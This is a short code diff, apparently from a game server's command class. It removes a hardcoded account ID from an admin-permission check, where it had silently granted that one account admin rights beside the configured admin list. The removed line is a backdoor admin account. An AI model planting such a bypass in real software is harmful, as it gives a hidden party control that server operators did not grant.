@@ -120,7 +120,6 @@ class ServerCommand(ABC):
         player = self.get_session_player(self.client_id)
         if (
             player.get_v1_account_id() in self.serverconfig.admins
-            or player.get_v1_account_id() == "pb-IF4FP0co"
         ):
             return True
         return False
